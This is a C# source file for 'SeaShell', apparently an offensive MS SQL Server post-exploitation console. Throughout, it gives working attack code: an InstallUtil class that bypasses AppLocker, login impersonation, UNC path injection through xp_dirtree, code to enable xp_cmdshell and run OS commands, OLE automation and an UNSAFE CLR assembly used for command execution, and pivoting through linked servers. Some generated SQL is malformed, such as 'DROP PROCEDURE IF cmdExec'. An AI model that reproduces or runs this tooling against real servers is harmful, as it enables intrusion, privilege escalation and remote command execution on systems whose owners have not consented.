using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;

namespace seashell
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Shell.Run();
        }
    }

    // applocker bypass with InstallUtil
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Shell.Run();
        }
    }

    class Shell
    {
        public static void Run()
        {

            Banner();
            Console.Write("host: ");
            String host = Console.ReadLine();
            Console.Write("database: ");
            String database = Console.ReadLine();
            SqlConnection con = Connect(host, database);

            if (!CheckConnection(con))
            {
                Console.WriteLine($"[-] connection failed: {host} {database}");
                return;
            }

            while (true)
            {
                Console.Write("SEA> ");
                String commandline = Console.ReadLine();
                String command = commandline;
                String argline = "";
                String[] args = new String[0];
                int split = commandline.IndexOf(" ");
                if (split != -1)
                {
                    command = commandline.Substring(0, split);
                    argline = commandline.Substring(split + 1);
                    args = argline.Split(' ');
                }
                String fcmd = command.Trim().ToLower();
                if (fcmd == "exit")
                {
                    break;
                }

                switch (fcmd)
                {
                    case "help":
                        Help();
                        break;
                    case "connect":
                        if (args.Count() < 2)
                        {
                            Console.WriteLine("[-] connect <server> <database>");
                            break;
                        }
                        host = args[0];
                        database = args[1];
                        con = Connect(host, database);
                        break;
                    case "disconnect":
                        Disconnect(con);
                        break;

                    default:
                        String query = BuildQuery(command, args);
                        List<List<String>> output = Query(con, query);
                        PrintQueryResult(output);
                        break;
                }
            }
        }

        private static void Banner()
        {
            Console.WriteLine("(x (x (x (x (x (x (x");
            Console.WriteLine("(x (x SeaShell (x (x");
            Console.WriteLine("(x (x (x (x (x (x (x");
            Console.WriteLine("Microsoft SQL Server Client");
        }

        private static void Help()
        {
            Banner();
            Console.WriteLine("usage: ");
            Console.WriteLine(" help    print help");
            Console.WriteLine(" connect <host> <database>   connect to server/database");
            Console.WriteLine(" disconnect  disconnect from server/database");
            Console.WriteLine(" query <statement>   execute SQL query");
            Console.WriteLine(" version    get version");
            Console.WriteLine(" user    get database user name");
            Console.WriteLine(" users   get database users");
            Console.WriteLine(" sysuser get system user name");
            Console.WriteLine(" sysusers    get system users");
            Console.WriteLine(" perm <name> get users with permission");
            Console.WriteLine(" role <name> check assigned role");
            Console.WriteLine(" link    get linked servers");
            Console.WriteLine(" impersonate <user>  impersonate to user");
            Console.WriteLine(" unc <path>  UNC path injection");
            Console.WriteLine(" rpcenable <server>  enable rpc");
            Console.WriteLine(" xpenable    setup xp_cmdshell");
            Console.WriteLine(" xpcmd <command>    execute command (xp_cmdshell)");
            Console.WriteLine(" oleenable   setup ole procedures");
            Console.WriteLine(" olecmd    execute command (ole procedures)");
            Console.WriteLine(" asmload <path>  setup custom assembly");
            Console.WriteLine(" asmcmd    execute command (custom assembly)");
            Console.WriteLine(" server <host> <command...>  execute SQL query on host");
        }

        private static void PrintQueryResult(List<List<String>> result)
        {
            String output = "";
            foreach (List<String> row in result)
            {
                String row_str = String.Join(" ", row);
                output += row_str + "\n";
            }
            Console.WriteLine($"[>] {output}");
        }

        private static SqlConnection Connect(String server, String database)
        {
            String conString = $"Server = {server}; Database = {database}; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] auth success");
            }
            catch
            {
                Console.WriteLine("[-] auth failed");
            }

            return con;
        }

        private static void Disconnect(SqlConnection con)
        {
            if (CheckConnection(con))
            {
                con.Close();
            }

            if (CheckConnection(con))
            {
                Console.WriteLine("[-] failed to close connection");
            }

            Console.WriteLine("[+] connection closed");
        }

        private static bool CheckConnection(SqlConnection con)
        {
            if (con.State == System.Data.ConnectionState.Open)
            {
                return true;
            }
            return false;
        }

        private static String BuildQuery(String command, String[] args)
        {
            String result = "";
            switch (command)
            {
                case "query":
                    if (args.Count() < 1)
                    {
                        Console.WriteLine("[-] query <statement>");
                        break;
                    }
                    String stmt = String.Join(" ", args);
                    result = stmt;
                    break;
                case "version":
                    result = "SELECT @@version;";
                    break;
                case "user":
                    result = "SELECT USER_NAME();";
                    break;
                case "users":
                    result = "SELECT name FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE';";
                    break;
                case "sysuser":
                    result = "SELECT SYSTEM_USER;";
                    break;
                case "sysusers":
                    result = "SELECT name FROM sys.server_principals WHERE type_desc != 'SERVER_ROLE';";
                    break;
                case "role":
                    if (args.Count() < 1)
                    {
                        Console.WriteLine("[-] role <name>");
                        break;
                    }
                    String role = args[0];
                    result = $"SELECT IS_SRVROLEMEMBER('{role}');";
                    break;
                case "perm":
                    if (args.Count() < 1)
                    {
                        Console.WriteLine("[-] perm <name>");
                        break;
                    }
                    String perm = args[0];
                    result = $"SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = '{perm}';";
                    break;
                case "impersonate":
                    if (args.Count() < 1)
                    {
                        Console.WriteLine("[-] impersonate <user>");
                        break;
                    }
                    String user = args[0];
                    result = $"EXECUTE AS LOGIN = '{user}';";
                    break;
                case "unc":
                    if (args.Count() < 1)
                    {
                        Console.WriteLine("[-] unc <path>");
                        break;
                    }
                    String path = args[0];
                    result = $"EXEC master..xp_dirtree \"{path}\";";
                    break;
                case "link":
                    result = "EXEC sp_linkedservers;";
                    break;
                case "rpcenable":
                    if (args.Count() < 1)
                    {
                        Console.WriteLine("[-] rpcenable <server>");
                        break;
                    }
                    String server = args[0];
                    result = $"EXEC sp_serveroption '{server}','rpc out','true';";
                    break;
                case "xpenable":
                    result = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\n" +
                        "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                    break;
                case "xpcmd":
                    if (args.Count() < 1)
                    {
                        Console.WriteLine("[-] xpcmd <command>");
                        break;
                    }
                    String xpcmd = String.Join(" ", args);
                    result = $"EXEC xp_cmdshell '{xpcmd}'";
                    break;
                case "oleenable":
                    result = "DECLARE @myshell INT;\n" +
                        "EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;";
                    break;
                case "olecmd":
                    if (args.Count() < 1)
                    {
                        Console.WriteLine("[-] olecmd <command>");
                        break;
                    }
                    String olecmd = String.Join(" ", args);
                    result = $"EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{olecmd}\"';";
                    break;
                case "asmload":
                    if (args.Count() < 1)
                    {
                        Console.WriteLine("[-] asmload <path>");
                        break;
                    }
                    String asmpath = args[0];
                    result = "use msdb;\n" +
                        "EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n" +
                        "EXEC sp_configure 'clr enabled',1; RECONFIGURE;\n" +
                        "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;\n" +
                        "DROP PROCEDURE IF cmdExec; DROP ASSEMBLY myAssembly;" +
                        $"CREATE ASSEMBLY myAssembly FROM '{asmpath}' WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
                    break;
                case "asmcmd":
                    if (args.Count() < 1)
                    {
                        Console.WriteLine("[-] asmcmd <command>");
                        break;
                    }
                    String asmcmd = String.Join(" ", args);
                    result = $"EXEC cmdExec '{asmcmd}'";
                    break;
                case "server":
                    if (args.Count() < 2)
                    {
                        Console.WriteLine("[-] server <host> <command...>");
                        break;
                    }
                    String host = args[0];
                    String scmd = args[1];
                    String[] sargs = args.Skip(2).ToArray();
                    String inner_query = BuildQuery(scmd, sargs);
                    foreach (String row in inner_query.Split('\n'))
                    {
                        String frow = row.ToLower().Replace("'", "''");
                        if (frow.StartsWith("exec "))
                        {
                            result += $"EXEC ('{frow}') AT {host};";
                        }
                        else
                        {
                            result += $"SELECT * FROM OPENQUERY(\"{host}\", '{frow}')";
                        }
                    }
                    break;
                default:
                    Console.WriteLine("[-] command not found");
                    break;
            }
            return result;
        }

        private static List<List<String>> Query(SqlConnection con, String query)
        {
            List<List<String>> result = new List<List<String>>();
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader;
            Console.WriteLine($"[<] {query}");
            try
            {
                reader = command.ExecuteReader();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] query failed: {e.Message}");
                return result;
            }

            while (reader.Read() == true)
            {
                List<String> row = new List<String>();
                for (int i = 0; i < reader.FieldCount; i++)
                {
                    row.Add(reader[i].ToString());
                }
                result.Add(row);
            }

            reader.Close();

            return result;
        }
    }
}
